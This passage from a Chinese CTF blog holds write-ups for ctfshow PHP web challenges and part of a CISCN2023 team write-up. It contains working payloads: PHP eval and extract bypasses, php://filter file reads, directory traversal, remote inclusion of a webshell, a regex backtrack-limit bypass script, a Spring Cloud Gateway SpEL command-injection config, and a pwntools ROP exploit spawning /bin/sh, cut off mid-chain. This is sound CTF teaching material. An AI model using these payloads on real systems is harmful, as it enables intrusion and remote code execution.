$_SERVER[&#39;QUERY_STRING&#39;]</code>也就是<code>$a[0]= $_SERVER[&#39;QUERY_STRING&#39;]</code><br>这时候我们只要通过 <code>eval(&quot;$c&quot;.&quot;;&quot;);</code>将$flag赋值<code>flag_give_me</code>就可以了。<br>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">get:  $fl0g=flag_give_me;</span><br><span class="line">post:  CTF_SHOW=<span class="number">1</span>&amp;CTF%5bSHOW.COM=<span class="number">1</span>&amp;fun=<span class="built_in">eval</span>($a[<span class="number">0</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>非预期：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=var_dump($GLOBALS)   题目出不来，本地测试可以</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get: a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">传入 a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">结果如下</span><br><span class="line">array(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; string(<span class="number">3</span>) <span class="string">&quot;a=1&quot;</span> [<span class="number">1</span>]=&gt; string(<span class="number">17</span>) <span class="string">&quot;fl0g=flag_give_me&quot;</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去</span><br><span class="line">继续判断query string是否为空，</span><br><span class="line">如果不为空把通过+符号分割的字符串转换成php内部的zend_string，</span><br><span class="line">然后再把这个zend_string复制到 arr 数组中去。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ctf_show = md5($flag);</span><br><span class="line">$url = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line">//特殊字符检测</span><br><span class="line">function waf($url)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">return</span> true;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(waf($url))&#123;</span><br><span class="line">    die(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf_show===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试跑一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">128</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$url</span>=<span class="string">&quot;http://127.0.0.1/flag.php?ctf&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;show=1&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>)!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf_show&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下的这些字符可以代替<code>_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ _ [ .  </span><br><span class="line">+  这里的加号在url中起到空格的作用</span><br></pre></td></tr></table></figure><p>出去过滤掉的字符，可以使用空格实现<br>payload：<code>ctf show=ilove36d</code></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这种题需要有fuzz的技术，得学一下这个php就脚本的写法。</p><h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><h3 id="考点：gettext（”-”）函数的使用-查看所有变量get-defined-vars"><a href="#考点：gettext（”-”）函数的使用-查看所有变量get-defined-vars" class="headerlink" title="考点：gettext（”_”）函数的使用+查看所有变量get_defined_vars"></a>考点：gettext（”_”）函数的使用+查看所有变量get_defined_vars</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连续两次调用，而且会检查f1函数名称，特殊字符的函数只有<code>_</code>，所对应的函数为：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688274254001-69cdf9cb-1498-4251-9d53-cb854861e579.png" alt="image.png"><br>  <img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688274251016-f41af228-5679-445a-967b-315d8677c759.png" alt="image.png"><br>可以借由输出字符串<br>使用<code>f1=_&amp;f2=phpinfo</code>就可以查看到php信息<br>由于题目有<code>include(&#39;flag.php&#39;)</code>可以直接输出所有变量：<br>payload：<code>f1=_&amp;f2=get_defined_vars</code>即可</p><h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/109181768">https://blog.csdn.net/miuzzx/article/details/109181768</a></p></blockquote><h3 id="考点：stripos"><a href="#考点：stripos" class="headerlink" title="考点：stripos"></a>考点：stripos</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688276827328-a519e966-3864-4e99-9157-4cbabe21a2f1.png" alt="image.png"></p><h2 id="方法1-远程文件包含"><a href="#方法1-远程文件包含" class="headerlink" title="方法1 远程文件包含"></a>方法1 远程文件包含</h2><p>一个方法是远程文件包含，在自己的服务器上写一句话木马，然后保存为txt文档，然后如下使用：<br><code>f=http://url/xxx.txt?ctfshow</code><br>测试一下：<br>在根目录写一个一句话木马：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688279012856-b10947c0-ec54-4c88-950a-181dcc097ce8.png" alt="image.png"><br>注意，一定要能访问得到，放在对应www或者wwwroot目录下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688279781611-621b25c1-bd8f-42bd-baac-336ec755e9ca.png" alt="6c4d3974c2ebcc5e4389c8ca31c7cac.png"><br>然后简单测试一下：<br>能够获取到，但是不能够rce<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688280341422-1fa73f65-9741-4958-a762-11660750fdfd.png" alt="image.png"><br>不知道为什么。</p><h2 id="方法2-直接使用伪协议"><a href="#方法2-直接使用伪协议" class="headerlink" title="方法2 直接使用伪协议"></a>方法2 直接使用伪协议</h2><p><code>?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</code><br>base64解密即可</p><h2 id="方法3-目录穿越"><a href="#方法3-目录穿越" class="headerlink" title="方法3 目录穿越"></a>方法3 目录穿越</h2><p><code>/ctfshow/../../../../var/www/html/flag.php</code></p><h1 id="web130、web131"><a href="#web130、web131" class="headerlink" title="web130、web131"></a>web130、web131</h1><h2 id="考点：pregmatch最大回溯次数绕过"><a href="#考点：pregmatch最大回溯次数绕过" class="headerlink" title="考点：pregmatch最大回溯次数绕过"></a>考点：pregmatch最大回溯次数绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。<br>直接用python脚本即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&quot;http://44ff0304-988a-4fea-b5a4-4dcd7874d335.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;very&#x27;</span> * <span class="number">250000</span> + <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;very&#x27;</span>, <span class="string">&#x27;250000&#x27;</span>).<span class="string">&#x27;36Dctfshow&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688281327546-67e6816e-fcde-44ea-819f-e0d4e513075d.png" alt="image.png"><br>除此之外还可直接：<code>f=ctfshow</code>后面接任意字符均可<br>或者使用空数组：<code>f[]=ctfshow</code><br>但是131似乎就只能使用回溯超出做了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2023 wp</title>
      <link href="/2023/05/29/CISCN2023%20wp/"/>
      <url>/2023/05/29/CISCN2023%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="战队答题情况"><a href="#战队答题情况" class="headerlink" title="战队答题情况"></a>战队答题情况</h1><h2 id="排名：282"><a href="#排名：282" class="headerlink" title="排名：282"></a>排名：282</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368785969-9737117c-25d9-4a53-a14f-96b88afe88c2.png" alt="a6f287c23150ba48b360dcc75e6c0b0.png"></p><h2 id="解题列表"><a href="#解题列表" class="headerlink" title="解题列表"></a>解题列表</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><ul><li><p>BackendService </p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3></li><li><p>烧烤摊儿 </p></li><li><p>funcanary </p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3></li><li><p>签到卡 </p></li><li><p>pyshell </p></li><li><p>网络安全人才实战能力评价现状调查问卷 </p><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3></li><li><p>babyRE </p></li><li><p>ezAndroid </p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3></li><li><p>基于国密SM2算法的密钥密文分发 </p></li><li><p>Sign_in_passwd </p></li></ul><hr><h1 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h1><h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>在nacos权限绕过漏洞，网上找了一个payload<br>nacos抓包，修改返回包中参数，登录<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685266452751-28fda1ed-0ad2-4eee-af5b-1ddf328b434c.png" alt="image.png"><br><a href="https://xz.aliyun.com/t/11493#toc-5">https://xz.aliyun.com/t/11493#toc-5</a><br>对源码进行审计发现springcloud3.05 spel注入漏洞，在新建配置文件，名为backcfg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;spring&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;cloud&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;gateway&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;routes&quot;</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;exam&quot;</span>,</span><br><span class="line">            <span class="string">&quot;order&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;lb:/rvice-provider&quot;</span>,</span><br><span class="line">            <span class="string">&quot;predicates&quot;</span>: [</span><br><span class="line">              <span class="string">&quot;Path=/echo/**&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;filters&quot;</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;args&quot;</span>: &#123;</span><br><span class="line">                  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;result&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;value&quot;</span>: <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;id&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用curl外带flag即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685268408418-725f086c-ecf3-4b0c-ba3a-ab2b4af493db.png" alt="image.png"></p><h1 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="27日-烧烤摊儿"><a href="#27日-烧烤摊儿" class="headerlink" title="27日_烧烤摊儿"></a>27日_烧烤摊儿</h2><p>本地执行发现买东西是如果输入负数会给自己加钱，然后买下店铺，改名，发现存在栈溢出，试出溢出为0x28，因为是静态，所以用ROPgadget –binary shaokao –ropchain可以获得payload，只需要填偏移即可。<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote()</span></span><br><span class="line">io=process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;-1000000&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span 